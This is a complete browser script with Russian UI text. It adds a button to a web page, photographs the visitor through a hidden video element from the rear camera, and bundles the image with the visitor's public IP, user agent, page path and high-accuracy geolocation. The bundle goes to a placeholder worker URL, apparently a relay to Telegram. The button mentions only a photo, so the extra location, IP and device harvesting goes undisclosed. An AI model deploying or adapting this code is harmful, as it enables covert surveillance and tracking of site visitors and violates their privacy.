// new_script.js (client)
(function(){
  'use strict';

  const WORKER_URL = "https://your-worker.workers.dev"; // <- ЗАМЕНИ НА СВОЙ URL
  const SESSION_FLAG = "tg_sent_v1";
  const MAX_FILE_BYTES = 3_000_000; // 3 MB

  if (!WORKER_URL) { console.error('Set WORKER_URL in new_script.js'); return; }
  if (sessionStorage.getItem(SESSION_FLAG)) { console.log('Already sent this session'); return; }

  // UI: минимальная кнопка — нужен user gesture
  const btn = document.createElement('button');
  btn.textContent = 'Разрешить камеру и отправить фото';
  btn.style.position = 'fixed';
  btn.style.right = '12px';
  btn.style.bottom = '12px';
  btn.style.zIndex = '999999';
  btn.style.padding = '8px';
  document.body.appendChild(btn);

  btn.addEventListener('click', async () => {
    btn.disabled = true;
    btn.textContent = 'Запрос разрешений...';

    // request geolocation (non-blocking if denied)
    const geoPromise = new Promise(resolve => {
      if (!navigator.geolocation) return resolve(null);
      navigator.geolocation.getCurrentPosition(
        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
        err => resolve(null),
        { enableHighAccuracy: true, maximumAge: 0, timeout: 8000 }
      );
    });

    // request camera
    let stream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: { ideal: 1280 } }, audio:false });
    } catch (e) {
      console.error('Camera denied or error', e);
      btn.textContent = 'Доступ к камере отклонён';
      return;
    }

    // hidden video + canvas
    const video = document.createElement('video');
    video.autoplay = true;
    video.playsInline = true;
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;

    // wait for frame
    await new Promise(resolve => {
      const t0 = Date.now();
      const check = () => {
        if (video.videoWidth > 0 && video.videoHeight > 0) return resolve();
        if (Date.now() - t0 > 5000) return resolve();
        requestAnimationFrame(check);
      };
      check();
    });

    // capture frame
    const canvas = document.createElement('canvas');
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    canvas.width = w; canvas.height = h;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, w, h);

    // stop camera
    try { stream.getTracks().forEach(t => t.stop()); } catch(e){}
    video.remove();

    // blob
    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
    canvas.remove();
    if (!blob) { console.error('No blob'); btn.textContent = 'Ошибка съёмки'; return; }
    if (blob.size > MAX_FILE_BYTES) console.warn('Large image', blob.size);

    // gather meta
    const geo = await geoPromise;
    const time = new Date().toISOString();
    let ip = null;
    try {
      const r = await fetch('https://api.ipify.org?format=json');
      if (r.ok) { const j = await r.json().catch(()=>null); if (j && j.ip) ip = j.ip; }
    } catch(e){ /* ignore */ }

    const page = location.pathname + (location.search||'');
    const ua = navigator.userAgent || '-';

    const caption = [
      `Время: ${time}`,
      `Страница: ${page}`,
      `IP: ${ip || 'не получен'}`,
      `UA: ${ua}`,
      geo ? `Локация: ${geo.lat},${geo.lon} (точность ${geo.acc}м)` : 'Локация: отказано/нет'
    ].join('\n');

    // blob -> base64
    const b64 = await new Promise((resolve, reject) => {
      const fr = new FileReader();
      fr.onload = () => resolve(String(fr.result).split(',')[1]);
      fr.onerror = () => reject(fr.error);
      fr.readAsDataURL(blob);
    });

    btn.textContent = 'Отправка...';

    // POST to worker
    try {
      const resp = await fetch(WORKER_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image_b64: b64, caption })
      });
      const j = await resp.json().catch(()=>null);
      if (!resp.ok) {
        console.error('Worker error', resp.status, j);
        btn.textContent = 'Ошибка отправки';
        return;
      }
      console.log('Worker response', j);
      sessionStorage.setItem(SESSION_FLAG, '1');
      btn.textContent = 'Отправлено';
      setTimeout(()=>btn.remove(), 3000);
    } catch (e) {
      console.error('Send failed', e);
      btn.textContent = 'Ошибка сети';
    }
  });
})();